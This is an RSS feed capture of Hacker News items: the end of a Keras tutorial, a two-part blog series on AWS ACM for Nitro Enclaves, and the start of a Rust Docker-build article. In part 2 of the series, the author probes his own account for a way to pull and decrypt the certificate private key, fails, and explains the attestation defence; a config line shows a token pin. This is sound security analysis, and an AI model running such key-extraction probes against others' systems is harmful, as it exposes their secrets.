model.add(Conv2D(64,(5,5), padding='same'))
model.add(BatchNormalization())
model.add(Activation('relu'))
model.add(MaxPooling2D(pool_size=(2, 2)))
model.add(Dropout(0.25))


model.add(Flatten())


model.add(Dense(1024))
model.add(BatchNormalization())
model.add(Activation('relu'))
model.add(Dropout(0.4))

model.add(Dense(4, activation='softmax'))</pre>
<p>Now, let‚Äôs see the learning rate schedule. Initially, we will be setting the learning rate to 0.005 and using ExponentialDecay we will decay its value after 5 steps with decay rate as 0.96. We will use Adam optimizer here.</p>
<pre data-enlighter-language="python" data-enlighter-theme="atomic">initial_learning_rate = 0.005
lr_schedule = tf.keras.optimizers.schedules.ExponentialDecay(
    initial_learning_rate,
    decay_steps=5,
    decay_rate=0.96,
    staircase=True)

optimizer = Adam(learning_rate=lr_schedule)</pre>
<p>So, Let‚Äôs compile the model now and check its summary.</p>
<pre data-enlighter-language="python" data-enlighter-theme="atomic">model.compile(optimizer=optimizer, loss='categorical_crossentropy', metrics=['accuracy'])
model.summary()</pre>
<p>Output:</p>
<pre>Model: "sequential"
_________________________________________________________________
Layer (type)                 Output Shape              Param #   
=================================================================
conv2d (Conv2D)              (None, 64, 128, 32)       832       
_________________________________________________________________
batch_normalization (BatchNo (None, 64, 128, 32)       128       
_________________________________________________________________
activation (Activation)      (None, 64, 128, 32)       0         
_________________________________________________________________
max_pooling2d (MaxPooling2D) (None, 32, 64, 32)        0         
_________________________________________________________________
dropout (Dropout)            (None, 32, 64, 32)        0         
_________________________________________________________________
conv2d_1 (Conv2D)            (None, 32, 64, 64)        51264     
_________________________________________________________________
batch_normalization_1 (Batch (None, 32, 64, 64)        256       
_________________________________________________________________
activation_1 (Activation)    (None, 32, 64, 64)        0         
_________________________________________________________________
max_pooling2d_1 (MaxPooling2 (None, 16, 32, 64)        0         
_________________________________________________________________
dropout_1 (Dropout)          (None, 16, 32, 64)        0         
_________________________________________________________________
flatten (Flatten)            (None, 32768)             0         
_________________________________________________________________
dense (Dense)                (None, 1024)              33555456  
_________________________________________________________________
batch_normalization_2 (Batch (None, 1024)              4096      
_________________________________________________________________
activation_2 (Activation)    (None, 1024)              0         
_________________________________________________________________
dropout_2 (Dropout)          (None, 1024)              0         
_________________________________________________________________
dense_1 (Dense)              (None, 4)                 4100      
=================================================================
Total params: 33,616,132
Trainable params: 33,613,892
Non-trainable params: 2,240
_________________________________________________________________</pre>
<h2>Model Training</h2>
<p>Before we start training the model, first we will do the checkpointing and save the weights for which the validation loss is minimum and accuracy is best. Then, using PlotLossesCallback function we will graphically show the loss and the accuracy after each epoch.</p>
<p>So for training, we will set the batch size as 32 and the number of epochs as 12. We will shuffle the inputs because if there is an order we can eliminate its possibility.</p>
<pre data-enlighter-language="python" data-enlighter-theme="atomic">checkpoint = ModelCheckpoint("model_weights.h5", monitor='val_loss',
                             save_weights_only=True, mode='min', verbose=0)
callbacks = [PlotLossesCallback(), checkpoint]#, reduce_lr]
batch_size = 32
history = model.fit(
    datagen_train.flow(x_train, y_train, batch_size=batch_size, shuffle=True),
    steps_per_epoch=len(x_train)//batch_size,
    validation_data = datagen_val.flow(x_val, y_val, batch_size=batch_size, shuffle=True),
    validation_steps = len(x_val)//batch_size,
    epochs=12,
    callbacks=callbacks
)</pre>
<p>Output:</p>
<pre><img loading="lazy" src="https://valueml.com/wp-content/uploads/2020/10/download-13.png" alt="" width="856" height="309" srcset="https://valueml.com/wp-content/uploads/2020/10/download-13.png 856w, https://valueml.com/wp-content/uploads/2020/10/download-13-300x108.png 300w, https://valueml.com/wp-content/uploads/2020/10/download-13-768x277.png 768w" sizes="(max-width: 856px) 100vw, 856px">
Log-loss (cost function):
training   (min:    0.367, max:    0.564, cur:    0.368)
validation (min:    0.362, max:    5.084, cur:    0.362)

accuracy:
training   (min:    0.710, max:    0.764, cur:    0.756)
validation (min:    0.250, max:    0.751, cur:    0.743)
100/100 [==============================] - 184s 2s/step - loss: 0.3682 - accuracy: 0.7556 - val_loss: 0.3623 - val_accuracy: 0.7425</pre>
<h2>Evaluating The Model</h2>
<p>Finally, we will evaluate the model with validation data. Here, we can find that the validation accuracy of the model is 75%.</p>
<pre data-enlighter-language="python" data-enlighter-theme="atomic">model.evaluate(x_val, y_val)</pre>
<p>Output:</p>
<pre>[0.3621701712545473, 0.75125]</pre>
<p>So now, let‚Äôs check the classification report of the model for true and predicted values.</p>
<pre data-enlighter-language="python" data-enlighter-theme="atomic">from sklearn.metrics import confusion_matrix
from sklearn import metrics
import seaborn as sns

y_true = np.argmax(y_val, 1)
y_pred = np.argmax(model.predict(x_val), 1)
print(metrics.classification_report(y_true, y_pred))
print("Classification accuracy: %0.6f" % metrics.accuracy_score(y_true, y_pred))</pre>
<p>Output:</p>
<pre>                 precision    recall  f1-score   support

           0       1.00     ‚Ä¶</pre></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://valueml.com/classifying-radio-signals-from-space-using-keras-in-python/">https://valueml.com/classifying-radio-signals-from-space-using-keras-in-python/</a></em></p>]]>
            </description>
            <link>https://valueml.com/classifying-radio-signals-from-space-using-keras-in-python/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24943079</guid>
            <pubDate>Fri, 30 Oct 2020 15:14:10 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Building Team Culture, Gitlab-Style]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24942918">thread link</a>) | @gajus
<br/>
October 30, 2020 | https://aboutsnack.com/blog/informal-communication-in-remote-work | <a href="https://web.archive.org/web/*/https://aboutsnack.com/blog/informal-communication-in-remote-work">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://aboutsnack.com/blog/informal-communication-in-remote-work</link>
            <guid isPermaLink="false">hacker-news-small-sites-24942918</guid>
            <pubDate>Fri, 30 Oct 2020 14:59:38 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[ACM for Nitro Enclaves ‚Äì How Secure Are They?]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24942832">thread link</a>) | @donkersgood
<br/>
October 30, 2020 | https://www.sentiatechblog.com/acm-for-nitro-enclaves-how-secure-are-they | <a href="https://web.archive.org/web/*/https://www.sentiatechblog.com/acm-for-nitro-enclaves-how-secure-are-they">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>The new EC2 Nitro Enclaves enable virtual machines to process private data without exposing its encryption key to the parent instance. In this post we will explore how Nitro Enclaves are used to securely process private keys stored in ACM.</p>
<p>This is part 2 in a two-part article. In the first part we review why Nitro Enclaves matter and how they can benefit your sensitive workloads: <a rel="noopener noreferrer" href="https://www.sentiatechblog.com/acm-for-nitro-enclaves-its-a-big-deal">ACM for Nitro Enclaves - It‚Äôs a Big Deal</a>.</p>
<h3>Overview</h3>
<p>This article follows the steps outlined in AWS‚Äô documentation: <a rel="noopener noreferrer" href="https://docs.aws.amazon.com/enclaves/latest/user/nitro-enclave-refapp.html">AWS Certificate Manager for Nitro Enclaves</a>. In their article, AWS builds the following architecture.</p>
<p><img src="https://images.ctfassets.net/9gzi1io5uqx8/4volL2Vsj6GH8kyvLASvYq/ceb73ac4e50f8779794628e56900f2b7/refarch.png?fit=scale&amp;w=1330" alt="ACM Reference Architecture"></p>
<p>As discussed in <a rel="noopener noreferrer" href="https://www.sentiatechblog.com/acm-for-nitro-enclaves-its-a-big-deal">part 1</a>, it‚Äôs essential for private keys stored in ACM to never be exposed. As such, it‚Äôs interesting to see how AWS keeps these private keys secure, while still hosting them on your (relatively insecure) EC2 instance. The answer, of course, lies in the new <a rel="noopener noreferrer" href="https://aws.amazon.com/blogs/aws/aws-nitro-enclaves-isolated-ec2-environments-to-process-confidential-data/">Nitro Enclaves</a>.</p>
<p>The two main topics for this post are:</p>
<ul>
<li>How are private keys transmitted (and can we intercept them)?</li>
<li>How are permissions assigned to the Nitro Enclave (and can we assume them)?</li>
</ul>
<h3>Launching an EC2 instance</h3>
<p>The first step is to launch an Enclave-enabled EC2 instance. From the <a rel="noopener noreferrer" href="https://docs.aws.amazon.com/enclaves/latest/user/nitro-enclave.html#nitro-enclave-reqs">requirements</a> we learn this can be any Nitro instance with an Intel or AMD processor. Further digging shows that the minimum size is an <code>m5a.xlarge</code>.</p>
<p>The operating system needs to be Linux. On Amazon Linux 2 the Nitro CLI is available in a yum repository. Installation instructions for other operating systems can be found on the Nitro Enclaves CLI <a rel="noopener noreferrer" href="https://github.com/aws/aws-nitro-enclaves-cli">Github page</a>.</p>
<p>Amazon has provided ready-to-go AMIs with NginX and the Nitro CLI pre-installed, so for this article we will use those. We will assign an IAM role with admin permissions to the instance so we won‚Äôt be limited in exploring access methods.</p>
<p>With the pre-build AMI deployed in a default VPC and an IAM role with admin permissions, our current architecture looks like this:</p>
<p><img src="https://images.ctfassets.net/9gzi1io5uqx8/4HFodRfnVjsleJ2YI6pVgg/66fce88c7b5ea3ba5234ae1bdee35d5e/deployment-1.png?fit=scale&amp;w=1330" alt="Deployment 1"></p>
<h3>Creating an ACM certificate</h3>
<p>ACM certificates are free, but we do need a valid domain name. I‚Äôve once purchased <code>vpcdemo.net</code>, so that‚Äôs what I will use for this article.</p>
<p>After we‚Äôve moved through the steps of requesting a certificate, it shows as <code>Issued</code> and has an ARN. We will need this ARN in the next step.</p>
<p><img src="https://images.ctfassets.net/9gzi1io5uqx8/5Oxxf6wRYgkMm7QgYxHyq/6933f73ec20c723ed0bd6a790e43b9d9/valid_cert.jpg?fit=scale&amp;w=1330" alt="Valid Certificate"></p>
<h3>Associating the IAM role with the certificate</h3>
<p>This is where it gets interesting. The <a rel="noopener noreferrer" href="https://docs.aws.amazon.com/enclaves/latest/user/nitro-enclave-refapp.html#role-cert">next step</a> in the process is to ‚ÄúAssociate the role with the ACM certificate‚Äù.</p>
<p>The command to achieve this is <code>aws ec2 --region [region] associate-enclave-certificate-iam-role --certificate-arn [certificate_ARN] --role-arn [role_ARN]</code></p>
<p>This means we‚Äôre telling ACM that our EC2 instance role is allowed to access this certificate and private key. But we haven‚Äôt created a Nitro Enclave yet, and this role is assigned to an EC2 instance <strong>we</strong> control. Does that mean we will be able to access the private key from our instance? Let‚Äôs find out.</p>
<p>Running the command above yields the following output:</p>
<pre><code>aws ec2 --region eu-central-1 associate-enclave-certificate-iam-role --certificate-arn arn:aws:acm:eu-central-1:123412341234:certificate/f2bb1a6e-5704-4702-beb7-a2c3f36e7103 --role-arn arn:aws:iam::123412341234:role/admin-role
{
    "EncryptionKmsKeyId": "cb8e3d89-cd82-4560-867c-641c0008fab2", 
    "CertificateS3BucketName": "aws-ec2-enclave-certificate-eu-central-1-prod", 
    "CertificateS3ObjectKey": "arn:aws:iam::123412341234:role/admin-role/arn:aws:acm:eu-central-1:123412341234:certificate/f2bb1a6e-5704-4702-beb7-a2c3f36e7103"
}
</code></pre>
<p>This output obviously refers to three things:</p>
<ul>
<li>An S3 bucket (owned by AWS)</li>
<li>An S3 object (that likely contains our certificate and private key)</li>
<li>A KMS key (that is likely used to decrypt sensitive data)</li>
</ul>
<p>In the next step, AWS describes we should assign new permissions to our EC2 instance‚Äôs IAM role:</p>
<pre><code>{
  "Version": "2012-10-17",
  "Statement": [
    {
        "Effect": "Allow",
        "Action": [
            "s3:GetObject"
        ],
        "Resource": ["arn:aws:s3:::aws-ec2-enclave-certificate-eu-central-1-prod/*"]
    },
    {
        "Effect": "Allow",
        "Action": [
            "kms:Decrypt"
        ],
        "Resource": "arn:aws:kms:eu-central-1:*:key/cb8e3d89-cd82-4560-867c-641c0008fab2"
    }
  ]
}
</code></pre>
<p>These permissions allow our role to fetch an object from the AWS-owned S3 bucket, and to use the AWS-owned KMS key to decrypt data. Let‚Äôs update our architecture diagram with these new components.</p>
<p><img src="https://images.ctfassets.net/9gzi1io5uqx8/7MJ5bL64JTG0hyNkvSiMhp/485436f06a14e2c4165a4ec00c940209/deployment-2.png?fit=scale&amp;w=1330" alt="Deployment 2"></p>
<h3>Retrieving the file from S3</h3>
<p>The <code>CertificateS3BucketName</code> and <code>CertificateS3ObjectKey</code> clearly identify where the ACM files are stored. Since our IAM Role now has all the necessary permissions, we can try to download the file.</p>
<pre><code>[ec2-user@ip-172-31-42-108 ~]$ aws s3 cp s3://aws-ec2-enclave-certificate-eu-central-1-prod/arn:aws:iam::123412341234:role/admin-role/arn:aws:acm:eu-central-1:123412341234:certificate/f2bb1a6e-5704-4702-beb7-a2c3f36e7103 .
download: s3://aws-ec2-enclave-certificate-eu-central-1-prod/arn:aws:iam::123412341234:role/admin-role/arn:aws:acm:eu-central-1:123412341234:certificate/f2bb1a6e-5704-4702-beb7-a2c3f36e7103 to ./f2bb1a6e-5704-4702-beb7-a2c3f36e7103
</code></pre>
<p>Lo and behold: it worked! We now have the ACM certificate files on our local machine. The million dollar question is what they contain.</p>
<h3>Analyzing the file contents</h3>
<p>We‚Äôll output the file and run it through <code>jq</code>:</p>
<p><img src="https://images.ctfassets.net/9gzi1io5uqx8/XdI3Sa3jYldy7criKPzHb/7ca202e4e65aaec1061f4400ee683073/file-contents.png?fit=scale&amp;w=1330" alt="File Contents"></p>
<p>The contents are in JSON format, with four keys:</p>
<ul>
<li><code>certificate</code></li>
<li><code>certificateChain</code></li>
<li><code>encryptedPrivateKey</code></li>
<li><code>encryptionMethod</code></li>
</ul>
<p>The first two values are unencrypted, but these are the public certificate files anyone visiting <code>vpcdemo.net</code> would receive. No secrets there.</p>
<p>The third value is the private key we‚Äôre looking for. Obviously, it‚Äôs been encrypted. However, we also got access to a KMS key‚Ä¶ Let‚Äôs see if we can use that to decrypt this value!</p>
<h3>Decrypting the private key</h3>
<p>First we‚Äôll store the <code>encryptedPrivateKey</code> in a variable: <code>PRIVKEY=$(cat f2bb1a6e-5704-4702-beb7-a2c3f36e7103 | jq -r '.encryptedPrivateKey')</code>.</p>
<p>Then we‚Äôll run the private key through KMS: <code>aws kms --region eu-central-1 decrypt --ciphertext-blob fileb://&lt;(echo $PRIVKEY | base64 -d) --output text --query Plaintext</code>.</p>
<p>Unfortunately, but expectedly, this results in the following output:</p>
<pre><code>An error occurred (AccessDeniedException) when calling the Decrypt operation: The ciphertext refers to a customer master key that does not exist, does not exist in this region, or you are not allowed to access.
</code></pre>
<p>So this doesn‚Äôt work. Let‚Äôs find out why. We‚Äôll start by looking at CloudTrail. It shows an interesting line:</p>
<pre><code>"errorMessage": "User: arn:aws:sts::123412341234:assumed-role/admin-role/i-025be0b6a191a2cde is not authorized to perform: kms:Decrypt on resource: arn:aws:kms:eu-central-1:194321236082:key/cb8e3d89-cd82-4560-867c-641c0008fab2",
</code></pre>
<p>This shows us that the KMS key is stored in account <code>194321236082</code>, and that our role was not allowed to use it. This is interesting, because we did exactly follow AWS‚Äô instructions, which added permissions for our role to use this KMS key. The answer must lie somewhere in the Nitro Enclaves.</p>
<h3>Running NginX with Nitro Enclaves</h3>
<p>After walking through the last few steps in the <a rel="noopener noreferrer" href="https://docs.aws.amazon.com/enclaves/latest/user/nitro-enclave-refapp.html#config-nginx">AWS docs</a> we‚Äôve got a running server with HTTPS:</p>
<pre><code>‚ûú  ~ curl -I -XGET https://vpcdemo.net
HTTP/1.1 200 OK
Server: nginx/1.18.0
Date: Fri, 30 Oct 2020 13:24:26 GMT
Content-Type: text/html
Content-Length: 3520
Last-Modified: Wed, 24 Jun 2020 18:17:11 GMT
Connection: keep-alive
ETag: "5ef398a7-dc0"
Accept-Ranges: bytes
</code></pre>
<p>In the NginX configuration at <code>/etc/pki/nginx/nginx-acm.conf</code> we see the following lines:</p>
<pre><code>ssl_certificate_key "engine:pkcs11:pkcs11:model=p11ne-token;manufacturer=Amazon;token=nginx-acm-token;id=%01;object=acm-key;type=private?pin-value=8c9d293b5fcbe9bc5f70fa400822a936";
ssl_certificate "/run/nitro_enclaves/acm/nginx-cert-6e67696e782d61636d2d746f6b656e.pem";
</code></pre>
<p>So the Nitro Enclave was able to download and decrypt my certificate, even though the parent instance wasn‚Äôt. The next question is how AWS has secured their KMS key so the parent instance can‚Äôt use it, but the Nitro Enclave using the same IAM Role <em>can</em>.</p>
<h3>Attestation</h3>
<p>The answer can be found in Jeff Barr‚Äôs <a rel="noopener noreferrer" href="https://aws.amazon.com/blogs/aws/aws-nitro-enclaves-isolated-ec2-environments-to-process-confidential-data/">blog post</a> and the <a rel="noopener noreferrer" href="https://docs.aws.amazon.com/enclaves/latest/user/set-up-attestation.html">Cryptographic attestation</a> chapter in the documentation. When a new enclave image file (the OS and code that runs in the enclave) is created, it will automatically hash its contents in various ways. These are then returned as platform configuration registers (PCRs). There are eight PCRs:</p>
<ul>
<li>PCR[0]: a hash of the enclave image file</li>
<li>PCR[1]: a hash of the Linux kernel and bootstrap</li>
<li>PCR[2]: a hash of the application</li>
<li>PCR[3]: a hash of the IAM role assigned to the parent instance</li>
<li>PCR[4]: a hash of the Instance ID of the parent instance</li>
<li>PCR[8]: a hash of the Enclave image file signing certificate</li>
</ul>
<p>The first one (PCR0) can be used in a KMS condition. From the <a rel="noopener noreferrer" href="https://docs.aws.amazon.com/kms/latest/developerguide/policy-conditions.html">KMS docs</a>:</p>
<blockquote>
<p>The kms:RecipientAttestation:ImageSha384 condition key allows the kms-decrypt, kms-generate-data-key, and kms-generate-random operations from an enclave only when the image hash from the signed attestation document in the request matches the value in the condition key. The ImageSha384 value corresponds to PCR[0] in the attestation document. This condition key is effective only when you call these APIs from an enclave using the Nitro Enclaves SDK.</p>
</blockquote>
<p>And from Jeff Barr‚Äôs blog post: ‚ÄúIn a real-world environment, I would create a KMS key policy that checks the PCR value as part of a Condition statement:‚Äù</p>
<pre><code>"Condition": {
"StringEqualsIgnoreCase": {
 "kms:RecipientAttestation:ImageSha384": "ecfd7aa6d1dcca1e0bba646e7d49ede2761651c68f13cee68b1141c182cd836baae37d05dd8e6260aa847369a7b27e24"
}
</code></pre>
<p>In simple terms: every enclave image has a signature that changes when the content of the enclave image changes. By setting the PCR[0] value at the time the image was built as a condition in KMS, the <code>Decrypt</code> operation will only be allowed when executed by this exact version of the enclave image. When somebody tampers with the image - or tries to use the role from the parent instance as we did above - the PCR0 will change, the KMS condition will no longer match, and access will be denied.</p>
<h3>Conclusion</h3>
<p>In this post we have analyzed the steps AWS ‚Ä¶</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.sentiatechblog.com/acm-for-nitro-enclaves-how-secure-are-they">https://www.sentiatechblog.com/acm-for-nitro-enclaves-how-secure-are-they</a></em></p>]]>
            </description>
            <link>https://www.sentiatechblog.com/acm-for-nitro-enclaves-how-secure-are-they</link>
            <guid isPermaLink="false">hacker-news-small-sites-24942832</guid>
            <pubDate>Fri, 30 Oct 2020 14:52:42 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[ACM for Nitro Enclaves ‚Äì It's a Big Deal]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24942831">thread link</a>) | @donkersgood
<br/>
October 30, 2020 | https://www.sentiatechblog.com/acm-for-nitro-enclaves-its-a-big-deal | <a href="https://web.archive.org/web/*/https://www.sentiatechblog.com/acm-for-nitro-enclaves-its-a-big-deal">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>The new AWS Nitro Enclaves allow EC2 instances to spin up an isolated child VM for cryptographic operations. This unlocks new security features, the first and maybe most important of which is ACM on EC2.</p>
<p>In this post we will explore why Nitro Enclaves are important. Specifically, we‚Äôll discuss why Amazon Certificate Manager (ACM) on EC2 matters. This is part 1 in a two-part article. In the second part - <a rel="noopener noreferrer" href="https://www.sentiatechblog.com/acm-for-nitro-enclaves-how-secure-are-they">ACM for Nitro Enclaves - How Secure Are They?</a> - we will do a deep dive on the internal mechanisms that make Nitro Enclaves tick.</p>
<h3>A brief introduction to HTTPS</h3>
<p>HTTPS, or HTTP over SSL, encrypts web traffic in transit. This prevents eavesdropping on sensitive information and guarantees that your browser is talking to the right server. To understand ACM, we need a quick overview of the basics of HTTPS. Please note that the details of this process might vary for different versions of SSL, TLS and cypher suites.</p>
<p><img src="https://images.ctfassets.net/9gzi1io5uqx8/1tLEomZQnmb8bsbzf6IeQM/729a794d26969cdc531622271c8e2b27/handshake.png?fit=scale&amp;w=1330" alt="SSL Handshake"></p>
<p>When a browser connects to a server over HTTPS, it first requests the server‚Äôs public certificate (1). It then verifies if the certificate was signed by a trusted certificate authority (3). This validates that the server is allowed to use this domain name.</p>
<p>Next, the browser generates a new, random key, called the <em>session key</em>. It encrypts this session key with the public key stored in the server‚Äôs certificate. Then it sends the session key back to the server (4).</p>
<p>The server uses the private key it has locally (and privately, hence the name) stored to decrypt the session key (5). It is essential to understand that <em>only</em> this private key can decrypt the session key. If the private key would leak or be stolen, anyone would be able to decrypt traffic destined for this server, or they would be able to impersonate this server.</p>
<p>The server and client use the session key to encrypt all traffic from that moment on, and the communication between browser and server is secured.</p>
<p>For additional context, check out my YouTube session on <a rel="noopener noreferrer" href="https://www.youtube.com/watch?v=IUpUIw5zH2g&amp;list=PLeJgtCMvQjZd0kuK82-Et9IYcp6EiOeYa&amp;index=10&amp;ab_channel=SentiaCloud">SSL and Scaling</a>.</p>
<h3>Introducing ACM</h3>
<p>From the introduction to HTTPS it should be clear that the private key is an extremely sensitive piece of data and should be protected at all costs. However, the web server <em>needs</em> access to the private key to decrypt traffic. Classically, this meant that any user or administrator with access to the server might also gain access to the private key and use it to nefarious ends.</p>
<p>This is where Amazon Certificate Manager comes in. ACM allows you to generate and store certificates in a highly secure Amazon environment. Specific trusted services, like Elastic Load Balancers and CloudFront, integrate with ACM and are allowed to retrieve the private keys stored in ACM. They then use these private keys to decrypt your traffic and forward the unencrypted traffic to your EC2 instances. The core feature of ACM is that it will <strong>never</strong> expose your private keys.</p>
<p><img src="https://images.ctfassets.net/9gzi1io5uqx8/65dW6dIbfPccC4HHz48dUS/1e53a34ad6880bae189ff27e3b08867e/acm-intro.png?fit=scale&amp;w=1330" alt="ACM Intro"></p>
<p>With the traffic to EC2 decrypted, there is no reason to store private keys on the EC2 instances anymore. This reduces the impact of users gaining access to your servers, regardless whether they are malicious or not.</p>
<h3>End-to-end encryption</h3>
<p>The attentive reader will have noticed that this solution does not result in end-to-end encryption. The unencrypted traffic stays within Amazon‚Äôs boundaries, but strict industries like finance or healthcare will not appreciate their data being plainly transmitted - inside or outside of Amazon‚Äôs virtual walls.</p>
<p>This means that if end-to-end encryption is a requirement, we need to go back to the drawing board. Amazon offers CloudHSM, which can do SSL offloading for EC2 instances in a very secure way, but CloudHSM is very expensive. The cost for a single CloudHSM instance in Ireland is $1.47 per hour. In a highly available setup you need to, at $2.94 per hour, or over $2000,- per month. Strict security requirements obviously come at a cost.</p>
<p>Additionally, CloudHSM does not integrate with ACM, which often means you‚Äôre managing your certificates in more than one place.</p>
<h3>The new Nitro Enclaves</h3>
<p>The <a rel="noopener noreferrer" href="https://aws.amazon.com/blogs/aws/aws-nitro-enclaves-isolated-ec2-environments-to-process-confidential-data/">new Nitro Enclaves</a> change this landscape significantly. You can now have end-to-end encryption without CloudHSM, while keeping your private keys secure.</p>
<p>With Nitro Enclaves, you separate part of your virtual machine‚Äôs hardware - for example 1 CPU and 512MB of its memory - to run as an independent virtual machine. This VM runs in full isolation. You can‚Äôt access its disk or network, you can‚Äôt login to it, you can do hardly anything with it. The only interaction you can have is over a <code>vsock</code> interface that is mounted on your parent instance.</p>
<p>In the second part of this article (<a rel="noopener noreferrer" href="https://www.sentiatechblog.com/acm-for-nitro-enclaves-how-secure-are-they">ACM for Nitro Enclaves - How Secure Are They?</a>) we will go into the inner workings of this process. The important details for now are that the Nitro Enclave <em>can</em> access the KMS service through a KMS proxy running on the parent host, and that the Nitro Enclave is cryptographically signed. This means that when the enclave connects to KMS, KMS can verify that the request is coming from a trusted enclave. Because the enclave is isolated, KMS can securely transfer data to the enclave, without any risk of that data being intercepted or retrieved.</p>
<h3>The result for ACM on EC2</h3>
<p>Let‚Äôs look at how the Nitro Enclaves enable end-to-end encryption. As discussed before, the essence of ACM is that it will never expose your private keys. Nitro Enclaves, on the other hand, run in full isolation but can securely communicate with KMS. ACM for Nitro Enclaves combines these properties by sending encrypted traffic to the parent EC2 instance, which requests its child Nitro Enclave to decrypt the traffic. The Nitro Enclave securely communicates with ACM to fetch the private key, and all requirements are met.</p>
<p><img src="https://images.ctfassets.net/9gzi1io5uqx8/79B9BqMV4DUxzpWvYcIFq5/4fa51c30ce67678a905cf69bd8ed234f/enclave-kms-acm.png?fit=scale&amp;w=1330" alt="ACM, KMS, Enclave"></p>
<h3>Technological marvel</h3>
<p>AWS are flexing their technological prowess here - big time. The ACM and KMS part is impressive, but mostly an elaboration on existing technologies. The Nitro Enclaves themselves, however, are taking virtualization to a whole new level. Taking a virtual machine and carving out CPU cores and memory to run <em>another</em> virtual machine in isolation, while the machine is running? Consider my mind blown.</p>
<p>This is the point where we see Amazon‚Äôs lead versus their competitors. While other public cloud providers are still building multi-AZ designs and getting their networking backbone in order, AWS has built a foundation that allows them to capitalize on completely new technologies and solutions.</p>
<p>I believe the Nitro architecture is still in its early days, and many more futuristic virtualization features await.</p>
<h3>Caveats</h3>
<p>No solution is perfect, and there are a few things you should know before rushing to implement Nitro Enclaves. First, there is instance sizing. Currently, the smallest supported instance for Nitro Enclaves is an <code>m5a.xlarge</code> with four vCPUs. You will likely split this into two vCPUs for the parent instance and two vCPUs for the enclave. Technically, you‚Äôre reserving an <code>m5a.large</code>'s worth of CPU for your enclave. In Ireland, this will cost $0.096 per hour, or about $70,- per instance per month. This is significantly cheaper than CloudHSM, but it‚Äôs not free either.</p>
<p>Second, only Linux and NginX currently support ACM for Nitro Enclaves. This means that if you‚Äôre running Apache, Tomcat, IIS or another solution for your web servers, you will need to wait for future support.</p>
<h3>Conclusion</h3>
<p>The new Nitro Enclaves unlock new ways to securely process sensitive data. ACM is a first example, but I‚Äôm sure many other implementations will soon be released. This article has explored why being able to process private data on an EC2 instance is a big deal. If you want to learn more about the technical implementation, check out <a rel="noopener noreferrer" href="https://www.sentiatechblog.com/acm-for-nitro-enclaves-how-secure-are-they">part 2</a> of this article.</p>
<p>I share posts like these and smaller news articles on <a rel="noopener noreferrer" href="https://twitter.com/donkersgood">Twitter</a>, follow me there for regular updates! If you have questions or remarks, or would just like to get in touch, you can also find me on <a rel="noopener noreferrer" href="https://www.linkedin.com/in/donkersgoed/">LinkedIn</a>.</p>
</div></div>]]>
            </description>
            <link>https://www.sentiatechblog.com/acm-for-nitro-enclaves-its-a-big-deal</link>
            <guid isPermaLink="false">hacker-news-small-sites-24942831</guid>
            <pubDate>Fri, 30 Oct 2020 14:52:27 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[5x Faster Rust Docker Builds with Cargo-Chef]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24942601">thread link</a>) | @lukastyrychtr
<br/>
October 30, 2020 | https://www.lpalmieri.com/posts/fast-rust-docker-builds/ | <a href="https://web.archive.org/web/*/https://www.lpalmieri.com/posts/fast-rust-docker-builds/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section>
  <article>
    
      
      
<ul id="frontmatter">
    <li>
        <time datetime="2020-10-23T19:00:10.47Z">October 23, 2020</time>
    </li>
    <span></span>
    <li> 2344 words </li>
    <span></span>
    <li> 12 min </li>
</ul>

      
<p><a href="https://github.com/LukeMathWalker/cargo-chef"><code>cargo-chef</code></a> is a new <code>cargo</code> sub-command to build <em>just</em> the dependencies of your Rust project based on a JSON description file, a <em>recipe</em>.<br>
<code>cargo-chef</code> can be used to fully leverage Docker layer caching, therefore massively speeding up Docker builds for Rust projects.<br>
On our commercial codebase (~14k lines of code, ~500 dependencies) we measured a <strong>5x speed-up</strong>: we cut Docker build times <strong>from ~10 minutes to ~2 minutes</strong>.<sup><a href="#circleci">1</a></sup> </p>
<p><em><a href="https://www.lpalmieri.com/subscribe">Subscribe to the newsletter</a> to be notified when a new article is published on this blog.</em></p>

<p>Rust shines at runtime, consistently delivering great performance, but it comes at a cost: compilation times.<br>
They have been consistently among the top answers in the Rust annual survey when it comes to <a href="https://blog.rust-lang.org/2020/04/17/Rust-survey-2019.html#rust-adoption---a-closer-look"><em>the biggest challenges or problems for the Rust project</em></a>.</p>
<p>Optimised builds (<code>--release</code>), in particular, can be gruesome - up to 15/20 minutes on medium projects with several dependencies. Quite common on web development projects pulling in many foundational crates from the async ecosystem (<code>tokio</code>, <code>async-std</code>, <code>actix-web</code>, <code>tonic</code>, <code>lapin</code>, etc.).</p>
<p>How does this impact your day-to-day if you are working on a Rust project?</p>

<p><a href="https://www.docker.com/">Docker</a> containers are a mainstream technology to deploy software in production environments - most organisations have a Continuous Integration/Continuous Deployment pipeline that clones a project from a version control system (e.g. GitHub) and builds a Docker image to be deployed on top of a container orchestrator (e.g. <a href="https://kubernetes.io/">Kubernetes</a>, <a href="https://www.nomadproject.io/">Nomad</a> or other commercial solutions).</p>
<p>In a Docker build you will always be using the optimised build profile (<code>--release</code>) to get top-performance in your production environment. More often than not CI/CD pipelines do not run on top of very beefy machines - a couple of cores, maybe, not much more than that.</p>
<p>This combination is deadly.<br>
It can take more than 30 minutes to go from a merged PR to rolling out the new version to your end-users.</p>
<p>Such a long delay can have nefarious knock-on effects.</p>
<h2 id="slow-docker-builds-will-kill-you">Slow Docker builds will kill you</h2>
<p>Slow Docker builds will, over time, reduce your deployment frequency.<br>
